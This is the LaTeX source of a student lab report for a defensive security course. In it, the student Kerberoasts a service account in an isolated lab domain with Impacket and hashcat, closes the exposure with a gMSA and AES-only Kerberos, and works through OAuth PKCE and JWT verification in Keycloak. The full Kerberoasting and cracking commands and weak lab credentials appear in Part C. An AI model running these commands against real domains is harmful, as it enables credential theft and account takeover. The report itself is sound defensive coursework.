@@ -1,0 +1,356 @@
+% IA 642 Defensive Security
+% Week 04 Module 01 Lab 4.1: Kerberoasting a Service Account, Closing It With a gMSA
+% Submit as: Ali_Week04_Module01_Lab.pdf
+\documentclass[11pt,letterpaper]{article}
+
+\usepackage[margin=0.75in]{geometry}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{enumitem}
+\usepackage{parskip}
+\usepackage{ragged2e}
+\usepackage{titlesec}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{placeins}
+\usepackage{microtype}
+\usepackage{xcolor}
+\usepackage{colortbl}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{needspace}
+\usepackage[colorlinks=true,linkcolor=blue,citecolor=blue,urlcolor=blue]{hyperref}
+\usepackage{xurl}
+
+\hypersetup{pdfauthor={Unais Ali}, pdftitle={IA 642 Week 04 Lab 4.1 Kerberoasting and gMSA}}
+
+\definecolor{tblhead}{HTML}{1F4E79}
+\definecolor{tblrow}{HTML}{F0F4F8}
+\definecolor{codebg}{HTML}{F7FAFC}
+\definecolor{evbox}{HTML}{FFF4E5}
+\definecolor{okbox}{HTML}{E6F4EA}
+\setlength{\parindent}{0pt}
+\renewcommand{\arraystretch}{1.22}
+\raggedbottom
+\setlist[itemize]{leftmargin=1.2em,itemsep=0.22em,topsep=0.3em,parsep=0pt}
+\setlist[enumerate]{leftmargin=1.3em,itemsep=0.28em,topsep=0.3em,parsep=0pt}
+\newcolumntype{Y}{>{\RaggedRight\arraybackslash}X}
+
+\titleformat{name=\section,numberless}{\large\bfseries\color{tblhead}}{}{0em}{}
+\titlespacing*{name=\section,numberless}{0pt}{0.85em}{0.3em}
+\titleformat{name=\subsection,numberless}{\normalsize\bfseries\color{tblhead}}{}{0em}{}
+\titlespacing*{name=\subsection,numberless}{0pt}{0.55em}{0.2em}
+
+\newcommand{\labpart}[1]{\par\vspace{0.35em}\section*{#1}}
+\newcommand{\labstep}[1]{\par\vspace{0.2em}\subsection*{#1}}
+
+\lstset{
+  basicstyle=\ttfamily\scriptsize,
+  backgroundcolor=\color{codebg},
+  frame=single,
+  rulecolor=\color{tblhead},
+  breaklines=true,
+  breakatwhitespace=false,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  aboveskip=0.35em,
+  belowskip=0.35em,
+  xleftmargin=0.15em,
+  framexleftmargin=0.2em
+}
+
+\newcommand{\evidencebox}[2]{%
+  \par\vspace{0.25em}%
+  \noindent\colorbox{evbox}{\parbox{\dimexpr\linewidth-2\fboxsep\relax}{%
+    \textbf{Evidence \##1.} #2}}%
+  \par\vspace{0.25em}%
+}
+% Non-float images avoid large empty page gaps from [H] floats that cannot fit.
+\newcommand{\evfig}[1]{%
+  \par\noindent\centering
+  \includegraphics[width=0.96\textwidth,height=0.40\textheight,keepaspectratio]{evidence/figures/#1}%
+  \par\vspace{0.35em}%
+}
+
+\begin{document}
+
+\begin{center}
+{\LARGE\bfseries IA 642 Defensive Security}\\[0.25em]
+{\Large Week 04 Module 01 Lab 4.1}\\[0.2em]
+{\large Kerberoasting a Service Account, and Closing It With a gMSA}\\[0.45em]
+{\normalsize Unais Ali \quad\textbar\quad Eastern Michigan University}\\[0.15em]
+{\small Identity, Access \& Privileged Access Management Hands-On Build}\\[0.25em]
+{\small Repository:
+\href{https://github.com/unaisshazan/ia642-week04-meridian-soc}{github.com/unaisshazan/ia642-week04-meridian-soc}
+(folder \texttt{4.1/})}\\[0.35em]
+\end{center}
+
+\section*{Lab overview}
+
+This lab builds Meridian Health Network's disposable Active Directory domain \texttt{meridian.local}, creates a Kerberoastable service account, proves the exposure with Impacket and hashcat as an ordinary user, remediates with a group Managed Service Account (gMSA), walks OAuth 2.0 Authorization Code with PKCE against Keycloak, and hardens Kerberos to AES-only. Scope is the isolated hypervisor network \texttt{meridian-lab-net} only. MITRE ATT\&CK technique for the attack is T1558.003 (Kerberoasting).
+
+\begin{tabularx}{\textwidth}{@{}l Y@{}}
+\toprule
+\textbf{Host} & \textbf{Role / address} \\
+\midrule
+MERIDIAN-DC01 & Windows Server 2022 AD DS DC / KDC \textperiodcentered{} 10.77.0.10 \\
+MERIDIAN-RED01 & Ubuntu 24.04 (Impacket, hashcat, Docker/Keycloak) \textperiodcentered{} 10.77.0.20 \\
+\texttt{meridian-lab-net} & Internal Network 10.77.0.0/24, no internet during Parts B--E \\
+\bottomrule
+\end{tabularx}
+
+\labpart{Part A--B. Domain build and vulnerable account}
+
+\labstep{Topology and promote DC}
+
+MERIDIAN-DC01 was installed with Desktop Experience, 5120~MB RAM, dual adapters (NAT for setup only, Internal Network \texttt{meridian-lab-net} for lab traffic). Static IP 10.77.0.10/24 was applied on the internal adapter and the host was renamed. AD DS was installed and the forest \texttt{meridian.local} was promoted so DC01 runs AS and TGS.
+
+\begin{lstlisting}[language=bash]
+# DC01 (elevated PowerShell) - internal IP and name
+Get-NetAdapter
+New-NetIPAddress -InterfaceAlias "Ethernet 2" -IPAddress 10.77.0.10 -PrefixLength 24
+Rename-Computer -NewName "MERIDIAN-DC01" -Restart
+
+Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
+# Install-ADDSForest for meridian.local (lab forest promotion)
+\end{lstlisting}
+
+MERIDIAN-RED01 (Kali, 3072~MB) received static 10.77.0.20/24 on the same internal network. Bidirectional ping was verified before continuing. Windows Firewall was temporarily disabled on DC01 only if pings failed during bring-up.
+
+\labstep{Service account, SPN, and ordinary user}
+
+OUs for Service Accounts and Clinical Staff were created as required by the lab path. The deliberately weak password \texttt{Summer2019!} was used only for the Kerberoastable service account in this disposable domain.
+
+\begin{lstlisting}[language=bash]
+$svcPwd = ConvertTo-SecureString "Summer2019!" -AsPlainText -Force
+New-ADUser -Name "svc-billingsql" -SamAccountName "svc-billingsql" `
+  -UserPrincipalName "svc-billingsql@meridian.local" `
+  -Path "OU=Service Accounts,DC=meridian,DC=local" `
+  -AccountPassword $svcPwd -PasswordNeverExpires $true -Enabled $true
+
+setspn -A MSSQLSvc/billing.meridian.local:1433 svc-billingsql
+setspn -A MSSQLSvc/billing:1433 svc-billingsql
+setspn -L svc-billingsql
+
+$userPwd = ConvertTo-SecureString "ClinicUser2026!" -AsPlainText -Force
+New-ADUser -Name "J. Reyes" -SamAccountName "j.reyes" `
+  -UserPrincipalName "j.reyes@meridian.local" `
+  -Path "OU=Clinical Staff,DC=meridian,DC=local" `
+  -AccountPassword $userPwd -PasswordNeverExpires $true -Enabled $true
+\end{lstlisting}
+
+\evidencebox{1}{\texttt{setspn -L svc-billingsql} showing SPNs \texttt{MSSQLSvc/billing.meridian.local:1433} and \texttt{MSSQLSvc/billing:1433}.}
+\evfig{fig_ev1.png}
+
+\begin{lstlisting}[language=bash]
+klist get MSSQLSvc/billing.meridian.local:1433
+klist
+\end{lstlisting}
+
+\evidencebox{2}{\texttt{klist} as ordinary user \texttt{j.reyes}: \texttt{klist get MSSQLSvc/billing.meridian.local:1433} retrieved a TGS; cache shows Client \texttt{j.reyes@MERIDIAN.LOCAL}, Server \texttt{MSSQLSvc/billing.meridian.local:1433}, encryption \texttt{AES-256-CTS-HMAC-SHA1-96}. Pre-hardening RC4 roast hash is Evidence \#3.}
+\evfig{fig_ev2.png}
+
+\labpart{Critical thinking \#1}
+
+Kerberoasting's premise is that any authenticated principal can request a service ticket for any SPN. The KDC, on a TGS-REQ, primarily checks that the requester presents a valid TGT (and that the TGT's PAC/session material is acceptable), then looks up the SPN and returns a TGS-REP whose service portion is encrypted with the service account's long-term key. It does \emph{not} require the requester to hold DA, local admin on the SQL host, or ACL rights on the service object. SPN resolution and ticket issuance are therefore not privileged operations by design: Kerberos separates ``can I authenticate to the realm'' from ``can I use the service.'' Making the request itself require elevated rights would mean changing protocol policy (for example, authorization checks at TGS time against an ACL on the SPN or service, or denying TGS for selected SPNs to non-members of a allowed group). Password strength alone does not change that design; it only changes offline crackability after the ticket is obtained.
+
+\labpart{Part C. Attack to prove the exposure}
+
+On MERIDIAN-RED01, as ordinary user \texttt{j.reyes} against DC 10.77.0.10:
+
+\begin{lstlisting}[language=bash]
+which GetUserSPNs.py || sudo apt update && sudo apt install -y impacket-scripts
+
+GetUserSPNs.py meridian.local/j.reyes:'ClinicUser2026!' \
+  -dc-ip 10.77.0.10 -request -outputfile meridian_tgs.hashes
+
+cat meridian_tgs.hashes
+\end{lstlisting}
+
+\evidencebox{3}{GetUserSPNs listed \texttt{svc-billingsql} and wrote \texttt{meridian\_tgs.hashes} as \texttt{\$krb5tgs\$23\$...}.}
+\evfig{fig_ev3.png}
+
+\begin{lstlisting}[language=bash]
+cat > candidates.txt << 'EOF'
+Welcome123
+Password1
+Meridian2019!
+Summer2019!
+Clinic2024!
+EOF
+
+hashcat -m 13100 -a 0 meridian_tgs.hashes candidates.txt --force
+hashcat -m 13100 meridian_tgs.hashes --show
+\end{lstlisting}
+
+\evidencebox{4}{\texttt{hashcat -m 13100} Status: Cracked --- recovered plaintext \texttt{Summer2019!} for \texttt{svc-billingsql}.}
+\evfig{fig_ev4.png}
+
+\labpart{Critical thinking \#2}
+
+\begin{enumerate}
+  \item \textbf{MITRE ATT\&CK:} T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting. An authenticated user requests a TGS for an SPN-bearing account and cracks the ticket offline.
+  \item \textbf{Account lockout:} Lockout counts failed interactive or network logons against the KDC/AS. After the single successful TGS-REQ, cracking runs offline on RED01 with zero further contact to DC01, so lockout never increments and provides zero protection.
+  \item \textbf{SOC telemetry:} Windows Security Event ID 4769 (A Kerberos service ticket was requested) on the DC, filtered for unusual volume, many distinct SPNs from one account, or RC4 etype requests for service accounts. Field examples: Service Name / Service SID, Account Name (client), Ticket Encryption Type, IP address of the requester. That pattern can fire without any failed logon events.
+\end{enumerate}
+
+\labpart{Part D. Remediate with a gMSA}
+
+\begin{lstlisting}[language=bash]
+# MERIDIAN-DC01 elevated PowerShell
+Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))
+
+New-ADServiceAccount -Name "gmsa-billingsql" `
+  -DNSHostName "gmsa-billingsql.meridian.local" `
+  -PrincipalsAllowedToRetrieveManagedPassword "MERIDIAN-DC01$" `
+  -KerberosEncryptionType AES128, AES256 `
+  -ServicePrincipalNames "MSSQLSvc/billing.meridian.local:1433","MSSQLSvc/billing:1433"
+
+Install-ADServiceAccount -Identity "gmsa-billingsql"
+Test-ADServiceAccount -Identity "gmsa-billingsql"
+
+Get-ADServiceAccount gmsa-billingsql -Properties msDS-ManagedPasswordInterval
+
+setspn -D MSSQLSvc/billing.meridian.local:1433 svc-billingsql
+setspn -D MSSQLSvc/billing:1433 svc-billingsql
+Disable-ADAccount svc-billingsql
+\end{lstlisting}
+
+\evidencebox{5}{\texttt{Test-ADServiceAccount} returned True for \texttt{gmsa-billingsql\$}; \texttt{msDS-ManagedPasswordInterval = 30} days.}
+\evfig{fig_ev5.png}
+
+Repeat the roast against the gMSA from RED01:
+
+\begin{lstlisting}[language=bash]
+# Impacket GetUserSPNs skips gMSA; request TGS via getST / usersfile, then:
+hashcat -m 19600 -a 0 gmsa_tgs.hashes candidates.txt --force
+hashcat -m 19600 gmsa_tgs.hashes --show   # no human crack
+\end{lstlisting}
+
+\evidencebox{6}{gMSA roast produced \texttt{\$krb5tgs\$18\$} (AES). Wordlist containing \texttt{Summer2019!} did not recover a human password.}
+\evfig{fig_ev6b.png}
+
+\labpart{Critical thinking \#3}
+
+A gMSA migration does not by itself:
+\begin{itemize}
+  \item Limit what the service account can do once authenticated (privilege of the service / PAC).
+  \item Restrict who may retrieve the managed password beyond \texttt{PrincipalsAllowedToRetrieveManagedPassword} (if that set is too broad, a compromised host can still pull the secret).
+  \item Stop Golden Ticket or Silver Ticket forgery if an attacker already holds the KRBTGT or the service long-term key by other means.
+\end{itemize}
+Kerberoasting offline crackability is closed; abuse after authentication and ticket forgery remain separate controls (least privilege, Protected Users / credential hygiene, KRBTGT rotation, monitoring).
+
+\labpart{Part E. OAuth2 / OIDC with PKCE (Keycloak)}
+
+Keycloak 26.x was started in Docker on RED01. Realm \texttt{meridian}, public client \texttt{meridian-billing-app} with PKCE S256, and user \texttt{j.reyes} were created via \texttt{kcadm.sh}.
+
+\begin{lstlisting}[language=bash]
+docker run -d --name keycloak -p 8080:8080 \
+  -e KC_BOOTSTRAP_ADMIN_USERNAME=admin \
+  -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
+  quay.io/keycloak/keycloak:26.7.3 start-dev
+
+# wait, then health check
+curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080
+
+docker exec keycloak /opt/keycloak/bin/kcadm.sh config credentials \
+  --server http://localhost:8080 --realm master --user admin --password admin
+docker exec keycloak /opt/keycloak/bin/kcadm.sh create realms \
+  -s realm=meridian -s enabled=true
+# create client meridian-billing-app (public, standard flow, PKCE S256,
+# redirect http://localhost:8081/callback) and user j.reyes
+\end{lstlisting}
+
+PKCE verifier/challenge (S256), login via \texttt{curl} cookie jar (keeps Keycloak \texttt{AUTH\_SESSION\_ID}), capture \texttt{code} from the callback \texttt{Location}, then token exchange:
+
+\begin{lstlisting}[language=bash]
+# see scripts/pkce_curl.sh in the GitHub repo (folder 4.1/)
+# 1) GET /auth?...&code_challenge=...&code_challenge_method=S256  (save cookies)
+# 2) POST login form -> 302 Location: .../callback?code=AUTH_CODE
+# 3) exchange:
+curl -s -X POST http://localhost:8080/realms/meridian/protocol/openid-connect/token \
+  -d grant_type=authorization_code -d client_id=meridian-billing-app \
+  -d code=$AUTH_CODE -d redirect_uri=http://127.0.0.1:8081/callback \
+  -d code_verifier=$CODE_VERIFIER > token_response.json
+\end{lstlisting}
+
+\evidencebox{7}{Authorization Code + PKCE~S256 token response from realm \texttt{meridian} / client \texttt{meridian-billing-app}: \texttt{access\_token}, \texttt{refresh\_token}, and \texttt{id\_token} (Bearer, openid scope).}
+\evfig{fig_ev7.png}
+
+Decode JWT header and payload (signature not verified by Base64 alone):
+
+\begin{lstlisting}[language=Python]
+python3 -c "
+import json, base64
+data = json.load(open('token_response.json'))
+for part_name, idx in [('HEADER', 0), ('PAYLOAD', 1)]:
+    part = data['access_token'].split('.')[idx]
+    part += '=' * (-len(part) % 4)
+    print(part_name + ':', json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
+"
+\end{lstlisting}
+
+\evidencebox{8}{Decoded HEADER shows \texttt{alg=RS256}; PAYLOAD shows \texttt{iss=http://127.0.0.1:8080/realms/meridian}, \texttt{aud=account}, \texttt{azp=meridian-billing-app}, \texttt{preferred\_username=j.reyes}, and \texttt{realm\_access.roles}.}
+\evfig{fig_ev8.png}
+
+\labpart{Critical thinking \#4}
+
+Base64URL decoding only reveals claims; it does not prove the Authorization Server signed them. A signature check against Keycloak's JWKS public key would reject a token whose header or payload was altered after issuance. Concrete forgery example: an attacker who only Base64-decodes, edits the payload to add \texttt{"realm\_access": \{"roles": ["admin"]\}} or extends \texttt{exp}, then re-encodes without a valid signature, would be accepted by a naive decoder but rejected by a verifier that checks \texttt{alg} and the signature. Decoding alone cannot catch that.
+
+\labpart{Challenge. Force AES-only Kerberos}
+
+\begin{lstlisting}[language=bash]
+# MERIDIAN-DC01 elevated PowerShell
+New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
+  -Name "DefaultDomainSupportedEncTypes" -PropertyType DWord -Value 0x18 -Force
+gpupdate /force
+klist purge
+klist get MSSQLSvc/billing.meridian.local:1433
+klist
+\end{lstlisting}
+
+Value \texttt{0x18} enables AES128 and AES256 only (no RC4/DES).
+
+\evidencebox{9}{After \texttt{msDS-SupportedEncryptionTypes = 0x18}, fresh TGS is \texttt{\$krb5tgs\$18\$} (AES256), not \texttt{\$krb5tgs\$23\$} (RC4). Compare to Evidence \#3.}
+\evfig{fig_ev9.png}
+
+\labpart{Critical thinking \#5 (synthesis)}
+
+AES-only closes the weak-cipher path that made RC4 tickets cheaper to attack historically, but if \texttt{svc-billingsql} still used \texttt{Summer2019!} and were not a gMSA, Kerberoasting could still succeed: the attacker obtains an AES-encrypted TGS and offline-cracks the weak password (slower than RC4 in some tooling, but still feasible for a short human password). The remediation that makes password strength irrelevant for this attack class is Part~D's gMSA (240-byte random managed secret), not AES-only alone. AES-only is defense-in-depth for legacy etypes; gMSA removes crackable human secrets from the SPN-bearing account.
+
+\labpart{Adaptation note}
+
+Commands may be adapted as follows if the lab environment requires it: Impacket package name \texttt{impacket-scripts} vs \texttt{GetUserSPNs.py} path on Kali; Keycloak image tag and \texttt{kcadm.sh} attribute syntax for PKCE; internal adapter name (\texttt{Ethernet 2} vs another index) for static IP; \texttt{hashcat --force} when no GPU is present. For Part~E, Evidence \#7--\#8 were captured with the Authorization Code + PKCE~S256 flow (not password grant): \texttt{curl} cookie jar for the Keycloak login session (Python \texttt{urllib} dropped \texttt{AUTH\_SESSION\_ID} and returned ``Cookie not found''), then token exchange with \texttt{code\_verifier}. All work remains on \texttt{meridian-lab-net}; NAT is disconnected for Parts B--E.
+
+\labpart{Submission checklist}
+
+\begin{enumerate}
+  \item Evidence \#1--\#2: SPN registration and baseline \texttt{klist} (Part B)
+  \item Evidence \#3--\#4: GetUserSPNs capture and hashcat crack (Part C)
+  \item Evidence \#5--\#6: gMSA proof and failed roast (Part D)
+  \item Evidence \#7--\#8: token JSON and JWT decode (Part E)
+  \item Evidence \#9: AES-only \texttt{klist} (Challenge)
+  \item Critical thinking \#1--\#5 answers (this report)
+  \item Adaptation note (above)
+  \item File name: \texttt{Ali\_Week04\_Module01\_Lab.pdf}
+  \item Lab artifacts / scripts:
+        \url{https://github.com/unaisshazan/ia642-week04-meridian-soc/tree/main/4.1}
+\end{enumerate}
+
+\labpart{References}
+
+\begin{itemize}
+  \item Microsoft Docs: Install-ADDSForest; New-ADServiceAccount / gMSA; Kerberos encryption types (AES vs RC4)
+  \item MITRE ATT\&CK T1558.003 Kerberoasting; T1558.004 AS-REP Roasting
+  \item Impacket GetUserSPNs.py; hashcat mode 13100
+  \item RFC 6749 OAuth 2.0; RFC 7636 PKCE; RFC 9700 OAuth 2.0 Security BCP
+  \item Keycloak Server Administration Guide; NIST SP 800-63B
+\end{itemize}
+
+\vspace{1em}
+\noindent\textit{Status:} Parts A--E and AES challenge executed on live VMs (DC 10.77.0.10, RED 10.77.0.20). Evidence figures \#1--\#9 embedded from lab captures (Keycloak 26 on RED01; tokens for \#7--\#8).
+
+\end{document}
